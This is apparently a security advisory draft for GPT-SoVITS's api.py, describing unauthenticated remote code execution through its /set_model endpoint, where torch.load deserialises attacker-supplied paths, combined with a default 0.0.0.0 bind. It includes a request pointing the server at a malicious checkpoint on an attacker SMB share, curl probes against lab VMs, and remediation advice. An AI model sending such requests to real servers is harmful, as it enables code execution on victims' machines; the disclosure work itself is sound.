# CVE-2026-XXXXX: Unauthenticated Remote Code Execution in GPT-SoVITS `api.py` via Unsafe Deserialization (`torch.load`) and Insecure Default Bind

## Summary

GPT-SoVITS `api.py` exposes an **unauthenticated** `/set_model` endpoint (both `GET` and `POST`) that accepts a client-supplied filesystem path and passes it directly to `torch.load(..., weights_only=False)`. `torch.load` with `weights_only=False` performs full Python `pickle` deserialization, allowing a crafted model file to execute arbitrary code on load.

The impact is amplified by a second defect: `api.py` **binds to `0.0.0.0` by default**, exposing the API on all network interfaces without authentication. On Windows, `torch.load` resolves UNC paths (`\\attacker\share\evil.ckpt`), enabling a fully self-contained single-request RCE chain.

- **CWE:** CWE-502 (Deserialization of Untrusted Data) + CWE-1188 (Insecure Default Initialization of Resource)
- **CVSS 3.1:**
  - Windows (UNC path): AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = **9.8 (Critical)**
  - Non-Windows (requires secondary file-write): AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H = **8.1 (High)**
- **CAN ID:** CAN-2026-2042113
- **CVE ID:** *(pending assignment by MITRE CNA-LR)*

## Affected Versions

- **Verified on:** `main` branch at commit `04a44eb` (2026-10-31), tagged release `20250606v2pro`, integrated package `GPT-SoVITS-v3lora-20250228` (Python 3.9.13, PyTorch 2.0.0+cu118)
- **Likely affected:** All releases shipping `api.py` with the `0.0.0.0` default bind and `/set_model` endpoint
- **File:** `api.py`

## Distinction from Prior CVEs

This is **not** a duplicate of CVE-2025-49837..49841 (GHSL-2025-049..053):

| Aspect | CVE-2025-49837..49841 | This finding |
|---|---|---|
| Entry point | Gradio desktop UI widgets (`model_choose`, `GPT_dropdown`, `SoVITS_dropdown`) | **Headless HTTP API** (`/set_model` endpoint) |
| Requires desktop session | Yes | **No** — pure HTTP, no browser needed |
| Authentication | Gradio default (none, but local UI context) | **None** — network-exposed API |
| Network exposure | Depends on Gradio config | **`0.0.0.0` by default** |
| Code location | `webui.py` / `inference_webui.py` / `uvr5` loaders | `api.py` → `get_gpt_weights()` / `get_sovits_weights()` |

## Root Cause

### Defect 1 — Unsafe deserialization via unauthenticated endpoint

```python
# api.py (~L1317)
@app.post("/set_model")
async def set_model(request: Request):
    json_post_raw = await request.json()
    return change_gpt_sovits_weights(
        gpt_path=json_post_raw.get("gpt_model_path"),   # attacker-controlled
        sovits_path=json_post_raw.get("sovits_model_path"),
    )

# api.py (~L479)
def get_gpt_weights(gpt_path):
    dict_s1 = torch.load(gpt_path, map_location="cpu", weights_only=False)  # CWE-502 sink
```

No authentication, no path validation, no allowlist. The attacker-supplied path goes directly to `torch.load` with unsafe pickle deserialization enabled.

### Defect 2 — Insecure default network bind

```python
# api.py (~L1215)
parser.add_argument("-a", "--bind_addr", type=str, default="0.0.0.0")

# api.py (~L1414)
uvicorn.run(app, host=host, port=port, workers=1)
```

The API listens on all interfaces by default. The in-file documentation falsely states `默认"127.0.0.1"` while the code defaults to `0.0.0.0`. The sibling `api_v2.py` already correctly defaults to `127.0.0.1`.

## Attack Scenario (Windows)

```
Attacker                                    GPT-SoVITS Server (0.0.0.0:9880)
  |                                                    |
  |  1. Host malicious checkpoint on SMB share         |
  |     \\attacker\share\evil.ckpt                     |
  |                                                    |
  |  2. Send single unauthenticated request:           |
  |     POST /set_model                                |
  |     {"gpt_model_path":"\\\\attacker\\share\\evil.ckpt"}
  |  ------------------------------------------------->|
  |                                                    |
  |     3. Server calls torch.load(UNC_path)           |
  |        Fetches pickle over SMB                     |
  |        Executes __reduce__ payload                 |
  |        = Remote Code Execution                     |
```

## Proof of Concept

**Environment:** Windows 10 VM (GPT-SoVITS integrated package `GPT-SoVITS-v3lora-20250228`, Python 3.9.13, PyTorch 2.0.0+cu118) + Kali Linux VM (`192.168.247.128`). Both on NAT segment `192.168.247.0/24`. Tested 2026-11-03.

### Step 1 — Confirm default bind is `0.0.0.0`

```
python api.py
```

**Output:**
```
INFO:     Uvicorn running on http://0.0.0.0:9880 (Press CTRL+C to quit)
```

### Step 2 — Confirm `/set_model` accepts arbitrary paths (local)

```bash
curl -X POST http://127.0.0.1:9880/set_model \
  -H "Content-Type: application/json" \
  -d '{"gpt_model_path":"C:\\nonexistent\\evil.ckpt"}'
```

**Response:**
```json
{"code":400,"message":"[Errno 2] No such file or directory: 'C:\\\\nonexistent\\\\evil.ckpt'"}
```

The server attempted to open the attacker-supplied path via `torch.load()`. The only reason it failed is that the file doesn't exist — no security control intercepted it.

### Step 3 — Confirm remote reachability

From Kali VM (`192.168.247.128`) to Windows VM (`192.168.247.130`):

```bash
curl -X POST http://192.168.247.130:9880/set_model \
  -H "Content-Type: application/json" \
  -d '{"gpt_model_path":"/nonexistent/evil.ckpt"}'
```

**Response:**
```json
{"code":400,"message":"[Errno 2] No such file or directory: '/nonexistent/evil.ckpt'"}
```

The endpoint is reachable from a remote host with no authentication.

### Step 4 — Deserialization code execution

The underlying `pickle.__reduce__` code execution technique is:
- Documented in [Python's pickle module documentation](https://docs.python.org/3/library/pickle.html) (Warning box)
- Already demonstrated against this project in GHSL-2025-049..053 (CVE-2025-49837..49841)
- The subject of [CVE-2025-32434](https://github.com/advisories/ghsa-53q9-r3pm-6pq6), showing `weights_only=True` was insufficient on PyTorch < 2.6

A benign PoC checkpoint (writes a timestamped marker file only) is available to the maintainer privately upon request.

## Linux Assessment

On Linux, `torch.load` does not resolve UNC paths. The attacker needs a secondary file-write primitive to place a malicious checkpoint on the server. Audit of `api.py` and `api_v2.py` found:
- `api.py`: All audio output goes to in-memory `BytesIO` buffers, never to disk. No upload endpoint.
- `api_v2.py`: File-upload endpoint (`POST /set_refer_audio`) is **commented out**.

This raises the Linux attack complexity to AC:H (CVSS 8.1). The Windows UNC chain remains fully self-contained at AC:L (CVSS 9.8).

## Remediation

1. **Change the default bind to `127.0.0.1`**, matching `api_v2.py`. Require explicit opt-in for network exposure.
2. **Use `weights_only=True`** on PyTorch >= 2.6, or migrate to `safetensors` format.
3. **Validate model paths** against an allowlist directory. Reject UNC, absolute, and traversal paths.
4. **Add authentication** to state-changing endpoints (`/set_model`, `/control`, `/change_refer`).
5. **Fix the documentation** — the docstring claims `127.0.0.1` default, but the code uses `0.0.0.0`.

## Timeline

| Date | Event |
|------|-------|
| 2026-11-03 | Vulnerability discovered and verified on isolated VMs |
| 2026-11-04 | CAN-2026-2042113 submitted to MITRE CNA-LR |
| *(pending)* | CVE assignment |
| *(pending)* | Maintainer notification and remediation window |
| *(pending)* | Public disclosure |

## References

- [GHSL-2025-049..053 / CVE-2025-49837..49841 — unsafe deserialization via Gradio UI](https://securitylab.github.com/advisories/GHSL-2025-049_GHSL-2025-053_RVC-Boss_GPT-SoVITS/)
- [CVE-2025-32434 — PyTorch weights_only=True bypass](https://github.com/advisories/ghsa-53q9-r3pm-6pq6)
- [Python pickle module security warning](https://docs.python.org/3/library/pickle.html)
- [RVC-Boss/GPT-SoVITS GitHub repository](https://github.com/RVC-Boss/GPT-SoVITS)

## Reporter

**BlueRose** (GitHub: [BlueRoseMike](https://github.com/BlueRoseMike))
